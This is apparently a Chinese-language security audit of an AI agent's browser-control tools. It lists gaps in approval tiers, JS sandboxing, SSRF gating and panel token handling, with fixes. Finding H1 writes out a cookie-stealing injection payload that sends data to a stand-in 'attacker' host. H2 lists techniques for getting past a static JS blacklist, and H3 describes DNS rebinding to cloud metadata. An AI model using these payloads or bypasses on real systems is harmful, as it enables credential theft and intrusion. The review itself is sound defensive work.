## ② 安全缺口清单（按严重度）

### 高（4 项）

**H1 — wait_for 文本/元素条件存在无审批的 JS 模板注入执行面**
- 位置：14 维度 §6.2「事件驱动 vs 轮询」——`Text`/`Element{text}` 条件经隔离世界 MutationObserver 谓词实现（`document.body.innerText.includes(t)`）。
- 问题：`t`（text 条件）是模型入参，文档未规定模板参数的转义/`JSON.stringify` 包裹方式。`text = "x'); fetch('http://attacker/?c='+document.cookie);//"` 形态可逃逸模板直插任意 JS；且 `wait_for` 在 17 §2.1 分级为**普通（dangerous=false，Ask 模式不弹窗）**——即构成**无审批的任意 JS 执行面**，与 evaluate 审批设计（17 §3）直接冲突。`JsPredicate` 变体（14 §6.1）虽未在 17 工具面暴露，但 text 注入面仍在。
- 修复建议：① 谓词模板一律 `JSON.stringify` 包裹参数 + 谓词代码过与 evaluate 相同的静态黑名单（无赋值/无 fetch/无副作用 API）；② 或 `wait_for` 升级为 dangerous；③ 增加注入形态单测（`');`/`</script>`/`fetch(` 等 fixture 断言拒绝）。
- 影响面：模型输出即被信任为「普通只读等待」，注入后可读写 DOM 任意值、发起网络请求。

**H2 — evaluate 的运行时保险不足以支撑「fail-closed」声明**
- 位置：17 §3.2「三层校验」+ 14 §8.3。
- 问题：隔离世界（isolated world）**共享 DOM、仅隔离 JS 全局面**（17 §3.2 自述）。静态词法黑名单是 DOM 触达的唯一防线，但存在确定可绕形态：`[].filter.constructor('...')`（经方法链取 Function 构造器）、`['doc'+'ument']` 拼接、`globalThis`/`this` 词法变体、`__crish_read` 返回值若为节点引用可继续 `.click()`/`.value=`（返回值形状未限定为纯 JSON 拷贝）。静态层漏网 = DOM 全权（读任意表单值、触发副作用、发起请求）。13 §5「脱敏」与 17 §6.2 只保护结果面，不保护执行面。
- 修复建议：① 运行时注入只读 DOM 代理（冻结 `document`/`window` 敏感成员，或经 `Object.freeze` 白名单视图对象），不依赖静态扫描兜底；② `__crish_read.*` 返回值一律经 `structuredClone`/纯 JSON 拷贝，禁止节点引用外泄；③ 补逃逸形态单测（方法链构造器/字符串拼接/`this` 变体/返回值可操作性），对齐 T-9 验收扩展。
- 影响面：evaluate 是本功能唯一的高权执行面（capability 开启后），静态层漏网即工具面越权。

**H3 — 页面级 SSRF 无传输层阻断，「门禁三检查点之传输层」跨文档空洞**
- 位置：11 §3.3 声明 `Network.setBlockedURLs｜IP 直连阻断（维度 17 门禁三检查点之传输层）`——但 17 §4 全文无 setBlockedURLs 的任何实现段落（模式清单/内网段 URL 模式/云元数据段）；14 §7.3 的解析级校验（`check_resolved`）仅用于导航场景，**动作检查点（17 §4.4）未承诺解析级校验**。
- 问题：① 门禁只拦「导航目标与动作所在页 URL」，**拦不住页面自身 JS 的 fetch/XHR**（恶意站点可扫描用户局域网、云主机上可读 `169.254.169.254` 元数据）；② DNS 重绑定：导航时解析为公网 IP 放行 → 页面加载中重绑定到 `127.0.0.1` → 主 URL 仍是公网域，动作检查点的字面量/白名单匹配与 60s 解析缓存均检不出；③ iframe 导航到内网（主 URL 不变）无检查点。
- 修复建议：① 17 补 setBlockedURLs 配置（内网段/云元数据/链路本地的 URL 通配模式，随门禁配置同步生成）；② 动作检查点升级为「URL 缓存 + 解析级复核」双步（`check_resolved`），或至少对 `169.254.169.254`/私网段做动作前强制重解析；③ iframe 导航事件（11 §5.1 NavigationStarted 含 frame）纳入门禁订阅。S0 应增加「恶意页面请求内网」e2e 验证项。
- 影响面：SSRF 残余面——受管浏览器访问被诱导/受污染的站点时，内网与云元数据可被页面读取并外传。

**H4 — 面板媒体通道 WS 的凭据面未闭合（token 派生、传输、校验、日志四缺一）**
- 位置：12 §1.3「token 与 CDP 会话 token 同源派生」+ URL query 携带 + Tauri invoke 回前端；10 §7.3「前端零暴露」契约。
- 问题：① 「同源派生」未定义派生方式——若为同一 SessionToken 字符串，前端即持有可关联 CDP 会话的凭据，10 §7.3「React 面板永远拿不到 CDP 端点字符串」的契约被稀释（前端虽缺 CDP 端口，但信息分散依赖脆弱）；② token 明文进 URL query——面板侧任何日志/错误上报/开发者工具/浏览器历史（若面板为 webview 环境）均可泄漏；③ 握手校验仅「失败即关连接」，无 Origin 校验与失败速率限制声明（本机恶意进程暴力尝试面，依赖 token 熵）；④ 该通道无 E8 式「端点/token 不进日志」回归测试。
- 修复建议：① 面板 token 独立 `uuid v4` 生成，与 CDP SessionToken/ws_path 无数学关联，仅经 `browser_panel_open` 一次性下发；② 传输改用 WS 子协议头或首条鉴权消息（不进 URL），或明确 URL 形态且禁止日志记录；③ 服务端校验 Origin（`tauri://localhost`/app 标识）+ 握手失败延迟退避；④ 补面板通道日志断言测试。
- 影响面：本机进程探测面 + 前端凭据面，是双通道设计（CDP + 帧 WS）当前最弱一环。

| 导航 8 | navigate/new_tab | false | Allow（门禁先行） | Allow | Allow | ✅ 门禁独立于矩阵，IP/内网硬门禁任何模式 Deny（T-7 断言）；back/forward/reload 门禁覆盖在 17 表未列全（L8） |
| | back/forward/reload/list_tabs/switch_tab/close_tab | false | Allow | Allow | Allow | ✅ close_tab 审计 ✓ |
| 感知 5 | snapshot/screenshot/wait_for/get_url/get_title | false | Allow | Allow | Allow | ⚠️ **wait_for 含 JS 模板执行面（H1）**——「普通」分级与实际执行面不符，是本矩阵唯一结构性缺陷 |
| 调试 3 | console/network | false | Allow | Allow | Allow | ⚠️ console 文本脱敏未列（L7）；network url(脱敏) ✓ |

**与既有 PermissionMode/decide 三态对接自洽性**：
- ✅ 消费 `decide(dangerous, requires_approval, mode)` 三态，无新模式；判定点唯一（run_browser_action 第 ③ 步）。
- ✅ 默认拒绝面（capability）先于矩阵、任何模式 Deny——**「full-access 不豁免」闭环成立**：浏览器侧的「红线」以「门禁硬门禁 + capability 面」形态落地，不依赖 `decide_with_redline` 的 redline 参数（17 §2.2 硬编码 false 是语义自洽的——红线语义由前置检查承担）；T-4/T-7 测试断言已锁定，需保持「capability 检查先于审批、审批前零 CDP 命令」的单测护栏。
- ⚠️ 未闭环残留：MCP 工具不受矩阵约束（R4 登记）；`requires_approval` 运行期升级置位（元素定位失败/页面改写）声明了但未给出具体触发面（低，随实现补）。
- ⚠️ 权限矩阵与执行面的错位仅一处：**wait_for（H1）**——矩阵按「只读感知」分级，执行面却含 JS 模板拼接。

## ④ 门禁残余面专项（SSRF / DNS 重绑定 / IPv6 / 双检查点）

**17 §4 总体设计评价**：白名单空=全允许（限公共互联网）+ IP/内网硬门禁不可豁免，是产品可用性与 SSRF 防控的合理折中；fail-closed 解析失败、黑名单优先、`*.example.com` 前缀语义、IPv4 段表完整度（127/8、10/8、172.16/12、192.168/16、169.254/16、0.0.0.0/8）达标。

| 残余面 | 现状 | 判定 | 缺口与建议 |
|---|---|---|---|
| 重定向（post-redirect） | 17 §4.4 动作检查点查事件总线缓存 URL；14 §7.1 动作后复核 + goBack 回退 | 🟡 | 导航完成到 frameNavigated 事件到达引擎的窗口期存在「旧 URL 缓存 + 新页面」错配；动作检查点应校验「当前版本号对应 URL」（与 snapshotVersion 联动），并明确动作检查点执行 `check_resolved` 而非仅 `check_url` |
| DNS 重绑定 | 17 R2：解析缓存（60s TTL）+ 动作检查点复核 | 🟡 | 60s 缓存恰好是重绑定的利用窗口（首查放行→重绑→缓存未失效）；建议导航后首个动作前强制重解析一次（缓存 TTL 缩短或导航事件失效缓存） |
| IPv6 映射 | `::1`、`fc00::/7`、`fe80::/10`、`::ffff:0:0/96` 已列 | ✅ | 段表覆盖映射地址；建议补 `100.64.0.0/10`（CGNAT）与 `198.18.0.0/15`（基准段）为低危加固 |
| **页面级 SSRF（最大残余面）** | 11 §3.3 声明 setBlockedURLs 传输层，17 无实现 | ❌ | 见 H3：页面 fetch 内网/云元数据无任何拦截；17 需补 setBlockedURLs 内网段 URL 模式配置 + iframe 导航订阅 + 云元数据显式阻断 |
| 双检查点漏口（14 vs 17） | 14 三检查点（动作前/导航预检/动作后复核）vs 17 双检查点（导航/动作） | 🟡 | 语义大部分等价但表述不一：14 的「导航预检（href 预匹配）」在 17 未提（实现时需确认 pre-click href 检查保留）；17 的动作检查点未承诺解析级校验（见上）；**统一为「导航入口/动作前/动作后」三检查点口径**，并以 17 §4.4 为准修订 14 |
| WebRTC 传输面 | 10 §3.2 第 22 行 `--force-webrtc-ip-handling-policy` 仅 enabled-domains 场景加 | 🟡 | 白名单空（默认）时页面可经 WebRTC 反射内网 IP（本机内网拓扑探测）；建议默认模式也加（disable_non_proxied_udp 无功能副作用） |
| localhost/本机 | T-5 断言 localhost 解析后阻断 ✓；IP 字面量可入白名单（显式调试留口） | ✅ | 白名单 IP 字面量是本机调试唯一途径，符合 17 R1 设计 |

**专项结论**：硬门禁本体达标；**残余面集中在「页面内请求（非导航面）」与「动作检查点的解析级校验缺失」两项**，均需 S0/S1 前补设计。
